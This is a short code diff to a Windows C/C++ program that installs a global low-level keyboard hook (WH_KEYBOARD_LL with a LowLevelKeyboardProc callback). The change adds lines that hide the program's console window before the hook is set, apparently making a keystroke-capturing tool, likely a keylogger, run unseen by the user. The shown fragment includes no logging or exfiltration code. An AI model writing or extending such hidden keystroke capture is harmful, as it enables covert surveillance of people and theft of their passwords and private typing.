@@ -48,6 +48,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
+	HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
+	
 	g_hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(NULL), 0);
 	if (!g_hKeyboardHook)
 		return 1;
